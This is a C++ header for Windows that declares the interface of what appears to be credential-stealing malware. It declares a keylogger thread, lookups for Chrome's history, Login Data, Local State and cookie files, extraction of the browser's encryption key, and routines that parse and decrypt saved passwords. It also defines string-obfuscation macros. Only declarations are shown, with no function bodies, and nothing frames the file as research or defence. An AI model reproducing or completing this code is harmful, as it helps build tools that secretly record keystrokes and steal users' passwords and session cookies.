#pragma once

#ifdef _WIN32

#include <Windows.h>
#include <Shlobj.h>
#include <string>
#include <nlohmann/json.hpp>
#include <locale>
#include <codecvt>
#include <sodium.h>
#include <fstream>
#include <iostream>
#include <thread>
#include <atomic>

#include <sqlite3.h>
#include <sodium/core.h>
#include <sodium/crypto_aead_aes256gcm.h>
#include <vector>
#include <wincrypt.h>


// Link against the required libraries
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Advapi32.lib")


//using namespace std;
using json = nlohmann::json;

#define MAX_LINE_LENGTH 1024
#define IV_SIZE 12

#define EXIT_FAILURE 1
#define EXIT_SUCCESS 0

// ANSI escape codes for colors
#define RESET   "\033[0m"
#define PURPLE  "\033[35m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"

#define XorStr(x) (char*)x
#define XOR(x) XorStr(x)

#define okay(msg, ...) printf(GREEN "[+] " RESET msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf(PURPLE "[-] " RESET msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf(YELLOW "[i] " RESET msg "\n", ##__VA_ARGS__)

namespace bitmen
{
	void LOG(const std::string& input);

	bool SpecialKeys(int S_Key);

	void KeyloggerThread();

	bool IsChromeInstalled();

	std::string DecryptStr(const std::string& bytes);

	std::wstring FindHistoryPath();

	bool GetHistory(const std::wstring& path);

	std::wstring FindLocalState();

	std::wstring FindLoginData();

	std::string getEncryptedKey(const std::wstring& localStatePath);

	int loginDataParser(const std::wstring& loginDataPath, DATA_BLOB decryptionKey);

	bool EnsureOutputFilesExist();

	std::wstring FindCookiesPath();

	bool GetCookies(const std::wstring& cookiesPath, DATA_BLOB decryptionKey);

	std::wstring FindWebDataPath();

	void displayMenu();

	DATA_BLOB decryptKey(const std::string& encrypted_key);

	void decryptPassword(unsigned char* ciphertext, size_t ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* decrypted);
}

#endif // _WIN32